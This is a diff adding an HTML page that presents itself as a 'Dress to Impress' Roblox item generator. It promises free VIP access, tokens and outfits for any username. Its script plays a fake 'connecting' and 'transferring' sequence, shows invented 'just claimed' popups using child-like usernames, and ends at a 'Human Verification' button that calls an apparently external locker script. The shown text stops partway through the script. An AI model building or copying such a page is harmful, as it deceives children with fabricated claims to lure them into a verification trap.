@@ -1,0 +1,1078 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>Dress to Impress Generator</title>
+    
+    <script type="text/javascript">
+        var WkUjN_MVD_DQbiVc={"it":4394068,"key":"44a41"};
+    </script>
+    <script src="js/cdaaac2.js"></script>
+
+    <style>
+        /* Import your custom font */
+        @font-face {
+            font-family: 'Refinery 95';
+            src: url('fonts/refinery-95-regular.ttf') format('truetype');
+        }
+
+        /* Reset some browser defaults */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /* Body styling with a lighter pink-to-white gradient background */
+        body.xload {
+            font-family: 'Refinery 95', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            /* overflow: hidden; */
+        }
+
+        html, body.xload {
+            overflow-x: hidden; /* Prevent horizontal scrolling */
+            max-width: 100vw; /* Ensure the width does not exceed the viewport width */
+            overflow-y: auto;
+            background: linear-gradient(180deg, #3e1b47, #1a1a2e);
+        }
+
+        /* Centralize everything within the container */
+        .container {
+            text-align: center;
+            max-width: 900px;
+            width: 100%;
+            padding: 20px;
+            transition: opacity 0.5s ease-out;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            flex-grow: 1;
+            height: 100%;
+            z-index: 2;
+        }
+
+        /* Central image (logo) - Add a shadow for a spooky effect */
+        .xload .central-image {
+            max-width: 300px;
+            width: 100%;
+            height: auto;
+            margin-bottom: 20px;
+            object-fit: cover;
+            margin-top: 50px;
+            filter: drop-shadow(0px 0px 10px #f97304); /* Spooky glow */
+        }
+
+        /* Input field styling with Halloween colors */
+        .xload  .user-input {
+            padding: 10px;
+            font-size: 16px;
+            font-family: 'Refinery 95', sans-serif;
+            border: 2px solid #f97304; /* Pumpkin orange */
+            border-radius: 25px;
+            outline: none;
+            margin-bottom: 5px;
+            width: 100%;
+            max-width: 350px;
+            transition: border-color 0.3s ease;
+            text-align: left;
+        }
+
+          .user-input:focus {
+            border-color: #e65c00; /* Darker orange */
+        }
+
+        /* Enhanced Button styling */
+        #generate-btn {
+            padding: 12px 25px;
+            font-size: 1.1rem;
+            background: linear-gradient(45deg, #f97304, #e65c00); /* Pumpkin orange gradient */
+            color: #1a0a2e; /* Dark purple text */
+            border: none;
+            border-radius: 25px;
+            box-shadow: 0 5px 15px rgba(249, 115, 4, 0.4);
+            cursor: pointer;
+            margin-bottom: 20px;
+            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
+            width: auto;
+            max-width: 200px;
+            text-align: center;
+        }
+
+          #generate-btn:hover {
+            background-color: #e65c00;
+            box-shadow: 0 8px 20px rgba(230, 92, 0, 0.7);
+            transform: scale(1.1);
+        }
+
+        /* Text above images */
+        .xload .image-instruction {
+            font-size: 18px;
+            color: #e6c800; /* Witchy yellow */
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+
+        .xload .image-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            justify-content: center;
+            margin-top: 15px;
+            align-items: flex-start;
+            padding-bottom: 70px;
+        }
+
+        .image-grid > div {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            width: 150px;
+            margin-bottom: 10px;
+        }
+
+        /* Images with a Halloween-themed glow */
+        .xload .flex-image {
+            width: 100%;
+            max-width: 250px;
+            height: auto;
+            border-radius: 50%;
+            object-fit: cover;
+            cursor: pointer;
+            transition: box-shadow 0.3s ease;
+        }
+
+        .flex-image.active {
+            box-shadow: 0 0 30px 10px rgba(249, 115, 4, 0.9); /* Bright orange glow when active */
+        }
+
+
+        /* Descriptions for each image */
+        .image-description {
+            font-size: 1rem;
+            color: #e6c800;
+            margin-top: 5px;
+            text-align: center;
+            font-weight: 600;
+        }
+
+        #error-msg {
+            font-size: 1rem;
+            color: red;
+            margin-bottom: 15px; /* Add margin below the warning */
+        }
+
+          #warning-msg, #item-warning-msg {
+            font-size: 1rem;
+            color: red;
+            text-align: center; /* Keep it centered below instruction */
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        /* Media Query for smaller screens */
+        @media (max-width: 768px) {
+            .flex-image {
+                max-width: 150px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .flex-image {
+                max-width: 120px;
+            }
+        }
+
+        .selectplatformtext {
+            font-size: 20px;
+            font-weight: 600;
+        }
+
+        /* Sequence - -------------------------------------------------------------------------------------------------------------------------------- */
+        /* Sequence - --------------------------------------------------------------------------------------------------------------------------------- */
+        /* Sequence - --------------------------------------------------------------------------------------------------------------------------------- */
+        /* Sequence   --------------------------------------------------------------------------------------------------------------------------------- */
+        /* Sequence -  --------------------------------------------------------------------------------------------------------------------------------- */
+
+        /* Sequence box with a haunted background */
+        .sequence-box {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            width: 450px;
+            height: 300px;
+            padding: 20px;
+            background-color: rgba(26, 10, 46, 0.9); /* Transparent dark background */
+            border: 2px solid #f97304;
+            border-radius: 25px;
+            margin-top: 20px;
+            opacity: 1;
+            transition: opacity 0.5s ease-out;
+            z-index: 2;
+        }
+
+        /* Media query for mobile devices */
+        @media (max-width: 768px) {
+            .sequence-box {
+                width: 95%;  /* Set width to 95% on mobile */
+            }
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        /* Pulse animation for spooky elements */
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.1);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        .pulse-animation {
+            animation: pulse 1s infinite ease-in-out;
+        }
+
+
+        /* Platform buttons styling */
+        .platform-buttons {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin-top: 20px;
+            margin-bottom: 20px;
+        }
+
+        .platform-button {
+            width: 80px;
+            height: 80px;
+            border-radius: 10px;
+            background-color: #eb592c;
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 5px 15px rgba(255, 102, 178, 0.4);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            transition: transform 0.2s ease, box-shadow 0.3s ease;
+            font-size: 1.6em;
+            color: white;
+        }
+
+        .platform-button img {
+            max-width: 60px;
+            height: auto;
+        }
+
+        .platform-button:hover {
+            transform: scale(1.1);
+            box-shadow: 0 8px 20px rgba(255, 64, 129, 0.7);
+        }
+
+        .loading-dots {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .dot {
+            width: 15px; /* Dot size */
+            height: 15px; /* Dot size */
+            margin: 0 5px;
+            border-radius: 50%;
+            background-color: #ffcc00; /* Bright yellow for spooky feel */
+            animation: pulse 0.6s infinite alternate;
+        }
+
+        .loading-dot:nth-child(2) {
+            animation-delay: 0.2s; /* Delay for the second dot */
+        }
+
+        .loading-dot:nth-child(3) {
+            animation-delay: 0.4s; /* Delay for the third dot */
+        }
+        /* Adjust the size of the images to be visually appealing */
+        #search-image, #tick-image, #transferring-image, #success-tick-image {
+            width: 120px;
+            height: auto;
+            margin: 10px 0;
+        }
+
+        #search-text, #verification-text, #connected-text, #username-transferring-text, #connecting-text, #transferring-text, #success-transfer-text {
+            font-size: 1.2rem;
+            font-weight: 600;
+            margin-top: 10px;
+            color: #ffcc00; /* Bright yellow for spooky feel */
+            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.7); 
+        }
+
+        /* Simple transition when showing elements */
+        .sequence-box {
+            transition: opacity 0.5s ease-out;
+        }
+
+        /* Define a pop-in effect */
+        @keyframes popIn {
+            0% {
+                transform: scale(0.5); /* Start smaller */
+                opacity: 0;            /* Start invisible */
+            }
+            100% {
+                transform: scale(1);    /* Full size */
+                opacity: 1;             /* Fully visible */
+            }
+        }
+
+        /* Define a pop-out effect */
+        @keyframes popOut {
+            0% {
+                transform: scale(1);    /* Full size */
+                opacity: 1;             /* Fully visible */
+            }
+            100% {
+                transform: scale(0.5);  /* Shrink down */
+                opacity: 0;             /* Fully invisible */
+            }
+        }
+
+        /* Apply the pop-in animation */
+        .pop-in {
+            animation: popIn 0.5s ease forwards;  /* Animation duration and easing */
+        }
+
+        /* Apply the pop-out animation */
+        .pop-out {
+            animation: popOut 0.5s ease forwards;  /* Animation duration and easing */
+        }
+
+        .pop-in-pulse {
+            animation: popIn 0.5s ease forwards, pulse 1s infinite ease-in-out;
+        }
+
+        /* Spinning animation for the loading cog */
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .spinning-cog {
+            width: 100px;
+            height: 100px;
+            margin: 20px 0;
+            animation: spin 2s linear infinite;  /* Continuous spinning */
+        }
+
+        /* Styling for the transferring box image */
+        .box-image {
+            width: 120px;
+            height: auto;
+            margin: 20px 0;
+        }
+
+
+        /* Spinning cog animation for username transferring */
+        #loading-username-image {
+            width: 100px;
+            height: auto;
+            animation: spin 2s linear infinite;
+        }
+
+
+        /* Style for the verification cross */
+        .verification-cross {
+            width: 100px;
+            height: auto;
+            margin: 20px 0;
+        }
+
+        /* Verify button styling */
+        #verify-btn {
+            padding: 10px 20px;
+            background-color: #f19749;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 1.1rem;
+            transition: background-color 0.3s ease;
+            margin-top: 20px; /* Add some margin to space it from the verification text */
+        }
+
+
+        /* Balloons - floating upwards  --------------------------------------------------------------------------------------------------------------------------------- */
+        /* Balloons - floating upwards  --------------------------------------------------------------------------------------------------------------------------------- */
+        /* Balloons - floating upwards  --------------------------------------------------------------------------------------------------------------------------------- */
+        /* Balloons - floating upwards  --------------------------------------------------------------------------------------------------------------------------------- */
+        /* Balloons - floating upwards  --------------------------------------------------------------------------------------------------------------------------------- */
+        /* Balloons - floating upwards  --------------------------------------------------------------------------------------------------------------------------------- */
+
+        /* Balloons with Halloween colors */
+        .balloon {
+            position: fixed;
+            bottom: -50px;
+            width: 60px;
+            height: 80px;
+            background-color: #f97304; /* Pumpkin orange */
+            border-radius: 50% 50% 45% 45%;
+            box-shadow: inset -5px -5px 15px rgba(0, 0, 0, 0.1),
+                        0 5px 10px rgba(0, 0, 0, 0.2);
+            z-index: 1;
+            animation: float 8s ease-in-out infinite;
+        }
+
+        .balloon.white {
+            background-color: #e6c800; /* Witchy yellow */
+        }
+
+        /* Reflection effect */
+        .balloon::before {
+            content: '';
+            position: absolute;
+            top: 20%;
+            left: 15%;
+            width: 20px;
+            height: 30px;
+            background-color: rgba(255, 255, 255, 0.6); /* Simulated reflection */
+            border-radius: 50%;
+            transform: rotate(-20deg);
+        }
+
+        /* Knot at the bottom */
+        .balloon::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 10px;
+            height: 10px;
+            background-color: inherit;
+            border-radius: 50%;
+        }
+
+        /* Balloon string */
+        .balloon .string {
+            position: absolute;
+            bottom: -80px;
+            left: 50%;
+            width: 2px;
+            height: 80px;
+            background-color: #999;
+            transform-origin: top; /* Fixes string detachment by anchoring its top */
+            transform: translateX(-50%) rotate(0deg);
+            animation: sway 2s ease-in-out infinite;
+        }
+
+        /* Floating animation */
+        @keyframes float {
+            0% {
+                transform: translateY(50vh) translateX(0);
+            }
+            100% {
+                transform: translateY(-120vh) translateX(-10px); /* Moves straight up and off the screen */
+            }
+        }
+
+        /* Swaying string */
+        @keyframes sway {
+            0% {
+                transform: translateX(-50%) rotate(0deg); /* Keeps the string centered */
+            }
+            50% {
+                transform: translateX(-50%) rotate(5deg); /* Gentle sway */
+            }
+            100% {
+                transform: translateX(-50%) rotate(0deg);
+            }
+        }
+
+
+
+        /* POP UP + announcemnt ------------------------------------------------------------------------------------------------ */
+        /* POP UP + announcemnt ------------------------------------------------------------------------------------------------ */
+        /* POP UP + announcemnt ------------------------------------------------------------------------------------------------ */
+        /* POP UP + announcemnt ------------------------------------------------------------------------------------------------ */
+        /* POP UP + announcemnt ------------------------------------------------------------------------------------------------ */
+
+
+        /* Popup box for claims */
+        #claim-popup {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background-color: rgba(255, 255, 255, 0.9); /* Transparent white background */
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            display: flex;
+            align-items: center;
+            padding: 10px;
+            width: 250px;
+            z-index: 10; /* Above balloons, but below content */
+            transition: opacity 0.5s ease, transform 0.5s ease;
+        }
+
+        #claim-popup.hidden {
+            opacity: 0;
+            transform: translateY(100px); /* Hidden by default */
+        }
+
+        .popup-avatar {width: 50px;height: 50px;border-radius: 50%;margin-right: 10px;}
+        .popup-content {flex-grow: 1;}
+
+        #claim-username {font-weight: bold;font-size: 1.1rem;margin: 0;}
+
+        #claim-message {font-size: 0.9rem; color: #555; }
+
+
+        /* Glow effect for Halloween announcement */
+        .promo-strip {background-color: rgba(0, 0, 0, 0.6);color: #f97304;text-align: center;padding: 8px 0;font-family: 'Refinery 95', sans-serif;font-size: 15px;z-index: 1000;box-shadow: 0 5px 15px rgba(0, 0, 0, 0.6);}
+
+        .promo-link {color: #ffecf3;text-decoration: none;font-weight: bold;transition: color 0.3s ease, transform 0.2s ease;}
+
+        .promo-link:hover {color: #f97304;transform: scale(1.05);}
+        #error-msg, #warning-msg, #item-warning-msg {font-size: 1rem;color: #e65c00;text-align: center;margin-bottom: 15px;} 
+    </style>
+
+
+    <link rel="stylesheet" href="css/all.min.css">
+    
+
+<link rel="me" href="https://www.blogger.com/profile/12517935258668605304">
+<meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
+<meta name="google-adsense-platform-domain" content="blogspot.com">
+</head>
+<body>
+
+    <div class="container" id="main-content">
+        <!-- Central Image -->
+        <img src="images/logo.png" alt="Logo Image" class="central-image"> 
+        
+        <!-- Input field for username and button -->
+        <input type="text" class="user-input" placeholder="Enter username" id="username">
+        <!-- Username warning and error messages (below input) -->
+        <p id="error-msg" class="error hidden"></p>
+        <button id="generate-btn">Generate</button>
+
+        <!-- Text above images with new warning message for item selection -->
+        <p class="image-instruction">Select an item you wish to generate to your Roblox account:</p>
+        <!-- Item selection warning messages -->
+        <p id="warning-msg" class="warning hidden">You can only select up to 2 items!</p>
+        <p id="item-warning-msg" class="warning hidden">Please select at least 1 item!</p>
+
+        <!-- Flexible Images Section (3 images only) -->
+        <div class="image-grid">
+            <div>
+                <img src="images/makeup.webp" alt="Makeup Image" class="flex-image">
+                <p class="image-description">Custom Makeup</p>
+            </div>
+            <div>
+                <img src="images/vip.png" alt="VIP Image" class="flex-image">
+                <p class="image-description">VIP Access</p>
+            </div>
+            <div>
+                <img src="images/x2money.png" alt="VIP Image" class="flex-image">
+                <p class="image-description">x2 money</p>
+            </div>
+            <div>
+                <img src="images/itemlimit.png" alt="VIP Image" class="flex-image">
+                <p class="image-description">+6 Item Limit</p>
+            </div>
+            <div>
+                <img src="images/rainbow.png" alt="VIP Image" class="flex-image">
+                <p class="image-description">Rainbow Skin</p>
+            </div>
+            <div>
+                <img src="images/walk.webp" alt="Image 3" class="flex-image">
+                <p class="image-description">Fast Walk</p>
+            </div>
+            <!-- New Images -->
+            <div>
+                <img src="images/topmodel.png" alt="Top Model" class="flex-image">
+                <p class="image-description">Top Model Rank</p>
+            </div>
+            <div>
+                <img src="images/diva.png" alt="Diva" class="flex-image">
+                <p class="image-description">Runway Diva Rank</p>
+            </div>
+            <div>
+                <img src="images/money.webp" alt="money" class="flex-image">
+                <p class="image-description">35,000 Tokens</p>
+            </div>
+            <div>
+                <img src="images/luxury.webp" alt="Luxury" class="flex-image">
+                <p class="image-description">Luxury Dress</p>
+            </div>
+            <div>
+                <img src="images/moon.png" alt="Moon" class="flex-image">
+                <p class="image-description">Moongazer Girl Set</p>
+            </div>
+            <div>
+                <img src="images/Futuristi.webp" alt="Futuristi" class="flex-image">
+                <p class="image-description">Futuristic Suit</p>
+            </div>
+            <div>
+                <img src="images/denim.webp" alt="Diva" class="flex-image">
+                <p class="image-description">Denim Bag</p>
+            </div>
+            <div>
+                <img src="images/french.png" alt="French" class="flex-image">
+                <p class="image-description">French Luxury Bag</p>
+            </div>
+            <div>
+                <img src="images/rich.png" alt="Rich" class="flex-image">
+                <p class="image-description">Rich Girl Bag</p>
+            </div>
+        </div>
+        
+    </div>
+    <div id="claim-popup" class="hidden">
+        <img id="claim-avatar" src="https://dress2.pages.dev/avatar1.png" alt="User Avatar" class="popup-avatar">
+        <div class="popup-content">
+            <p id="claim-username">User123</p>
+            <p id="claim-message">Just claimed 'VIP Access'</p>
+        </div>
+    </div>
+    
+    <!-- Single Sequence Box -->
+    <div class="sequence-box hidden" id="sequence-box">
+        <!-- Searching content -->
+        <div id="search-content">
+            <img src="images/search.png" alt="Searching" class="pulse-animation" id="search-image">
+            <div class="loading-dots">
+                <span class="dot"></span>
+                <span class="dot"></span>
+                <span class="dot"></span>
+            </div>
+            <p class="pulse-animation" id="search-text">Searching for user...</p>
+        </div>
+
+        <!-- Success Tick content -->
+        <div id="tick-content" class="hidden">
+            <img src="images/tick.png" alt="Success" id="tick-image">
+            <p id="connected-text">Connected to user</p>
+        </div>
+
+        <!-- Platform Selection content -->
+        <div id="platform-content" class="hidden">
+            <p id="connected-text" class="pulse-animation">Select Your Platform:</p>
+            <div class="platform-buttons">
+                <!-- <button class="platform-button"><img src="https://cdn-icons-png.flaticon.com/512/732/732225.png" alt=""></button>
+                <button class="platform-button"><img src="https://cdn-icons-png.flaticon.com/512/732/732260.png" alt=""></button>
+                <button class="platform-button"><img src="https://cdn-icons-png.flaticon.com/512/888/888839.png" alt=""></button>
+                <button class="platform-button"><img src="https://cdn-icons-png.flaticon.com/512/888/888841.png" alt=""></button> -->
+                <!-- <-- <button class="platform-button"><img src="" alt=""></button> -->
+                <button class="platform-button"><i class="fab fa-windows"></i></button>
+                <button class="platform-button"><i class="fab fa-xbox"></i></button>
+                <button class="platform-button"><i class="fab fa-android"></i></button>
+                <button class="platform-button"><i class="fab fa-apple"></i></button>
+            </div>
+        </div>
+        <!-- Connecting Sequence content -->
+        <div id="connecting-content" class="hidden">
+            <img src="images/loading.png" alt="Loading Cog" class="spinning-cog" id="loading-image">
+            <p id="connecting-text">Connecting to servers...</p>
+        </div>
+
+        <!-- Transferring Sequence content -->
+        <div id="transferring-content" class="hidden">
+            <img src="images/box.gif" alt="Transferring Box" class="box-image" id="transferring-image">
+                <div class="loading-dots">
+                <span class="dot"></span>
+                <span class="dot"></span>
+                <span class="dot"></span>
+            </div>
+            <p class="pulse-animation" id="transferring-text">Transferring items to servers...</p>
+        </div>
+
+        <!-- Success Transfer content -->
+        <div id="success-transfer-content" class="hidden">
+           <img src="images/tick.png" alt="Success" id="success-tick-image">
+           <p id="success-transfer-text">Successfully Transferred item</p>
+        </div>
+        <!-- Transferring to Username Sequence content -->
+        <div id="username-transferring-content" class="hidden">
+            <img src="images/loading.png" alt="Loading" class="spinning-cog" id="loading-username-image">
+            <div class="loading-dots">
+                <span class="dot"></span>
+                <span class="dot"></span>
+                <span class="dot"></span>
+            </div>
+            <p id="username-transferring-text">Transferring to <span id="transferring-username">Username</span>...</p> <!-- Username dynamically inserted -->
+        </div>
+
+        <!-- Verification Sequence content -->
+        <div id="verification-content" class="hidden">
+            <img src="images/cross.png" alt="Verification Needed" class="verification-cross" id="verification-cross-image">
+            <p id="verification-text">Human Verification needed to carry on...</p>
+            <div class="action">
+                <button onclick="_iE()" id="verify-btn" class="hidden">Verify</button> <!-- Hidden button, shown after 2 seconds -->
+            </div>
+        </div>
+
+        
+    </div>
+
+    <script src="js/jquery.js"></script>
+    <script>
+        // Select all images and set a limit of 2 highlights
+const images = document.querySelectorAll('.flex-image');
+let highlightedCount = 0;
+
+// Select the warning message and error message elements
+const warningMsg = document.getElementById('warning-msg');
+const errorMsg = document.getElementById('error-msg');
+const generateBtn = document.getElementById('generate-btn');
+const usernameInput = document.getElementById('username');
+const mainContent = document.getElementById('main-content');
+const itemWarningMsg = document.getElementById('item-warning-msg');
+
+function scrollToError(element) {
+    element.scrollIntoView({ behavior: 'smooth', block: 'center' });
+}
+
+// Function to handle image clicks
+images.forEach((image) => {
+    image.addEventListener('click', () => {
+        // If the image is already highlighted, remove the highlight
+        if (image.classList.contains('active')) {
+            image.classList.remove('active');
+            highlightedCount--;
+        } else {
+            // Only allow highlighting if less than 2 images are already highlighted
+            if (highlightedCount < 2) {
+                image.classList.add('active');
+                highlightedCount++;
+            } else {
+                // Show warning message if trying to select more than 2 items
+                warningMsg.classList.remove('hidden');
+                scrollToError(warningMsg);
+                setTimeout(() => {
+                    warningMsg.classList.add('hidden');
+                }, 3000); // Hide the warning message after 2 seconds
+            }
+        }
+    });
+});
+
+
+
+// BALLOON BACKGROUND ---------------------------------------------------------------------------------------------------------
+// Function to create and animate balloons
+function createBalloon(color) {
+    const balloon = document.createElement('div');
+    balloon.classList.add('balloon', color);
+
+    const string = document.createElement('div');
+    string.classList.add('string');
+    balloon.appendChild(string);
+
+    // Random position along the x-axis, but ensure the balloon stays within the viewport horizontally
+    const randomX = Math.random() * (window.innerWidth - 60); // Subtract balloon width to avoid overflow
+    balloon.style.left = `${randomX}px`;
+
+    // Append the balloon to the body
+    document.body.appendChild(balloon);
+
+    // Remove balloon once it floats off the screen
+    setTimeout(() => {
+        balloon.remove();
+    }, 8000); // Matches the float animation duration
+}
+
+// Generate multiple balloons at random intervals
+function generateBalloons() {
+    const colors = ['pink', 'white'];
+    
+    // Immediately generate the first balloon
+    const randomColor = colors[Math.floor(Math.random() * colors.length)];
+    createBalloon(randomColor);
+
+    // Continue generating balloons every 3 seconds
+    setInterval(() => {
+        const randomColor = colors[Math.floor(Math.random() * colors.length)];
+        createBalloon(randomColor);
+    }, 3000); // Reduced balloon generation rate (one every 3 seconds)
+}
+
+// Start generating balloons when the page loads
+window.onload = generateBalloons;
+
+
+// SEQUENCE ANIMATION ---------------------------------------------------------------------------------------------------------
+
+document.addEventListener('DOMContentLoaded', () => {
+    const generateBtn = document.querySelector('.xload #generate-btn');
+    const sequenceBox = document.querySelector('.xload #sequence-box');
+    const searchContent = document.querySelector('.xload #search-content');
+    const tickContent = document.querySelector('.xload #tick-content');
+    const platformContent = document.querySelector('.xload #platform-content');
+    const usernameInput = document.querySelector('.xload #username');
+    const errorMsg = document.getElementById('error-msg');
+    const itemWarningMsg = document.getElementById('item-warning-msg');
+    const activeImages = document.querySelectorAll('.flex-image.active');
+    const connectingContent = document.getElementById('connecting-content');
+    const platformButtons = document.querySelectorAll('.platform-button');
+    const connectingText = document.querySelector('.xload #connecting-text');
+    const transferringText = document.getElementById('transferring-text');
+    const transferringContent = document.getElementById('transferring-content');
+    const successTransferContent = document.getElementById('success-transfer-content');
+    const successTransferText = document.querySelector('.xload #success-transfer-text');
+    const usernameTransferringContent = document.querySelector('.xload #username-transferring-content');
+    const transferringUsernameText = document.querySelector('.xload #transferring-username');
+    const verificationContent = document.querySelector('.xload #verification-content');
+    const verifyBtn = document.querySelector('.xload #verify-btn');
+    const verificationCrossImage = document.getElementById('verification-cross-image');
+    const loadingDots = document.querySelector('#verification-content .loading-dots');
+
+    generateBtn.addEventListener('click', () => {
+        const username = usernameInput.value.trim();
+        const activeImagesCount = document.querySelectorAll('.flex-image.active').length;
+
+        // Clear any previous error messages
+        errorMsg.classList.add('hidden');
+        itemWarningMsg.classList.add('hidden');
+
+        // Username validation
+        if (username.length <= 2) {
+            errorMsg.textContent = 'Username must be more than 2 characters!';
+            errorMsg.classList.remove('hidden');  // Show error message
+            scrollToError(errorMsg);
+            return;  // Stop execution
+        } else if (username.length >= 16) {
+            errorMsg.textContent = 'Username must be less than 16 characters!';
+            errorMsg.classList.remove('hidden');  // Show error message
+            scrollToError(errorMsg);
+            return;  // Stop execution
+        }
+
+        // Item selection validation
+        if (activeImagesCount === 0) {
+            itemWarningMsg.classList.remove('hidden');  // Show item selection warning
+            scrollToError(itemWarningMsg);
+            setTimeout(() => {
+                itemWarningMsg.classList.add('hidden');  // Hide after 2 seconds
+            }, 2000);
+            return;  // Stop execution
+        }
+
+        const activeImages = document.querySelectorAll('.flex-image.active'); // Get selected items
+        let selectedItems = Array.from(activeImages).map(image => image.nextElementSibling.textContent); // Get item names
+        let selectedPlatform = '';
+
+        platformButtons.forEach(button => {
+            button.addEventListener('click', () => {
+                // Determine the platform based on the button pressed
+                selectedPlatform = button.querySelector('i').classList.contains('fa-windows') ? 'Windows' :
+                    button.querySelector('i').classList.contains('fa-xbox') ? 'Xbox' :
+                    button.querySelector('i').classList.contains('fa-android') ? 'Android' : 'Apple';
+
+                // Update the connecting text
+                connectingText.textContent = `Connecting to ${selectedPlatform} Servers...`;
+
+                // Hide platform selection and show connecting sequence
+                platformContent.classList.add('hidden');
+                connectingContent.classList.remove('hidden');
+                connectingContent.classList.add('pop-in');
+
+                // After 3 seconds, start the item transfer sequence
+                setTimeout(() => {
+                    connectingContent.classList.add('hidden');  // Hide connecting content
+                    transferItemSequence(0);  // Start transferring the first item
+                }, 3000);
+            });
+        });
+
+        // Function to handle item transfer sequence
+        function transferItemSequence(itemIndex) {
+            if (itemIndex < selectedItems.length) {
+                const currentItem = selectedItems[itemIndex];
+
+                // Update transferring text to show current item and platform
+                transferringText.textContent = `Transferring ${currentItem} to ${selectedPlatform} Servers...`;
+
+                // Show transferring content
+                transferringContent.classList.remove('hidden');
+                transferringContent.classList.add('pop-in');
+
+                // After 3 seconds, show the success transfer message
+                setTimeout(() => {
+                    transferringContent.classList.add('hidden'); // Hide transferring content
+                    successTransferText.textContent = `Successfully Transferred ${currentItem}`;
+                    successTransferContent.classList.remove('hidden');
+                    successTransferContent.classList.add('pop-in');
+
+                    // After 2 seconds, hide success content and transfer the next item if available
+                    setTimeout(() => {
+                        successTransferContent.classList.add('hidden'); // Hide success content
+                        transferItemSequence(itemIndex + 1);  // Move to the next item
+                    }, 2000);
+
+                }, 3000);
+            } else {
+                // All items have been transferred; start the username transferring sequence
+                startUsernameTransferringSequence();
+            }
+        }
+        
+
+        // Function to start the username transferring sequence
+        function startUsernameTransferringSequence() {
+            const username = usernameInput.value; // Get the username
+
+            // Update the username in the transferring text
+            transferringUsernameText.textContent = username;
+
+            // Show the username transferring sequence
+            usernameTransferringContent.classList.remove('hidden');
+            usernameTransferringContent.classList.add('pop-in');
+
+            // After 4 seconds, move to the verification sequence
+            setTimeout(() => {
+                usernameTransferringContent.classList.add('hidden'); // Hide the transferring sequence
+                startVerificationSequence(); // Start verification sequence
+            }, 4000);
+        }
+
+        // Function to start the verification sequence
+        function startVerificationSequence() {
+            verificationContent.classList.remove('hidden');
+            verificationContent.classList.add('pop-in');
+
+            // After 2 seconds, hide the cross and dots, and show the Verify button
+            setTimeout(() => {
+                verifyBtn.classList.remove('hidden'); // Show the Verify button
+                verifyBtn.classList.add('pop-in-pulse');
+            }, 2000);
+        }
+
+        // Hide main content
+        mainContent.classList.add('hidden');
+
+        // Show sequence box and trigger pop-in for search content
+        sequenceBox.classList.remove('hidden');
+        searchContent.classList.remove('hidden');
+        searchContent.classList.add('pop-in');
+
+        // After 3 seconds, pop out the search content and pop in the tick content
+        setTimeout(() => {
+            searchContent.classList.remove('pop-in');
+            searchContent.classList.add('pop-out');
+
+            setTimeout(() => {
+                searchContent.classList.add('hidden');  // Hide search content after pop-out
+                tickContent.classList.remove('hidden');
+                tickContent.classList.add('pop-in');
+                tickContent.classList.add('pulse-animation');
+
+                // After 2 seconds, pop out the tick content and pop in the platform selection
+                setTimeout(() => {
+                    tickContent.classList.remove('pop-in');
+                    tickContent.classList.add('pop-out');
+
+                    setTimeout(() => {
+                        tickContent.classList.add('hidden');
+                        platformContent.classList.remove('hidden');
+                        platformContent.classList.add('pop-in');
+                    }, 500);
+
+                }, 1000);
+
+            }, 500);
+
+        }, 3000);
+    });
+});
+
+
+// pop up ------------------------------------------------------------------------------------------------------------------------------
+// pop up ------------------------------------------------------------------------------------------------------------------------------
+// pop up ------------------------------------------------------------------------------------------------------------------------------
+// pop up ------------------------------------------------------------------------------------------------------------------------------
+// pop up ------------------------------------------------------------------------------------------------------------------------------
+// pop up ------------------------------------------------------------------------------------------------------------------------------
+
+document.addEventListener('DOMContentLoaded', () => {
+    // Updated avatar paths
+    const avatars = ['avatars/avatar1.png', 'avatars/avatar2.png', 'avatars/avatar3.png', 
+                     'avatars/avatar4.png', 'avatars/avatar5.png', 'avatars/avatar6.png', 
+                     'avatars/avatar7.png', 'avatars/avatar8.png', 'avatars/avatar9.png', 
+                     'avatars/avatar10.png'];
+
+    const items = ['VIP Access', 'Custom Makeup', 'Fast Walk', 'Top Model Rank', 'Runway Diva Rank',
+                   '35,000 Tokens', 'Luxury Dress', 'Moongazer Girl Set', 'Futuristic Suit', 'Denim Bag'];
+
+    // Predefined usernames (playful, for a young audience)
+    const usernames = [
+        'StarGirl25', 'QueenBee07', 'PrincessLily22', 'GamerGirl101', 'SweetPea13',
+        'LunaLove08', 'DivaStar99', 'GlitterQueen55', 'SunshineGal12', 'BellaDream18',
+        'Moonlight21', 'Fashionista99', 'SparkleStar08', 'RosyGamer33', 'StarlightGirl88',
+        'CandyQueen47', 'LilMiss24', 'DaisyGirl92', 'PinkPrincess23', 'ChicGirl19',
+        'DreamyBella17', 'CutiePie06', 'HappyStar28', 'GlitterGirl77', 'CoolGirl31'
+    ];
+;
+    // Function to randomly select a biased item (VIP claimed most)
+    function getRandomItem() {
+        const biasedItems = [...Array(8).fill('VIP Access'), ...items]; // Bias towards 'VIP Access'
+        return biasedItems[Math.floor(Math.random() * biasedItems.length)];
+    }
+
+    let presetIndex = 0; // To track which preset is currently being shown
+
